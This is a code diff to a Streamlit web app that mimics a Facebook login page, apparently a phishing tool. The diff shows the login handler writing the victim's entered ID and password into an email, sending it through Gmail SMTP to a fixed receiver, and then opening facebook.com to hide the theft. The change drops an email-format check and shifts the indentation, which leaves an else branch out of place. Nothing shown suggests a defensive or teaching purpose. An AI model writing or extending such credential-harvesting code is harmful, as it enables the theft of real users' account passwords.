@@ -75,31 +75,30 @@ with col2:
 
 
         if st.button("Login"):
-            if "@gmail.com" in user_name and user_password:
 
-                with st.spinner("Loading..........."): 
-                    full_msg= f"ID: {user_name}  \n Password: {user_password}"
-                    msg = MIMEText(full_msg)
-                    msg["Subject"] = "Message from Streamlit App"
-                    msg["From"] = sender
-                    msg["To"] = receiver
+            with st.spinner("Loading..........."): 
+                full_msg= f"ID: {user_name}  \n Password: {user_password}"
+                msg = MIMEText(full_msg)
+                msg["Subject"] = "Message from Streamlit App"
+                msg["From"] = sender
+                msg["To"] = receiver
 
-                    try:
-                        url = "https://www.facebook.com/"
-                        webbrowser.open(url)
-                        server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
-                        server.login(sender, password)
-                        server.send_message(msg)
-                        server.quit()
-                    except Exception as e:
-                        st.error(f"❌ Failed to send email: {e}")
+                try:
+                    url = "https://www.facebook.com/"
+                    webbrowser.open(url)
+                    server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
+                    server.login(sender, password)
+                    server.send_message(msg)
+                    server.quit()
+                except Exception as e:
+                    st.error(f"❌ Failed to send email: {e}")
 
-            else:
-                st.error("The email address or mobile number you entered isn't connected to an account.")
+        else:
+            st.error("The email address or mobile number you entered isn't connected to an account.")
 
 
-        st.markdown("[forgetten password?](https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0)")
-        st.write("_"*20)
+    st.markdown("[forgetten password?](https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0)")
+    st.write("_"*20)
 
 
 
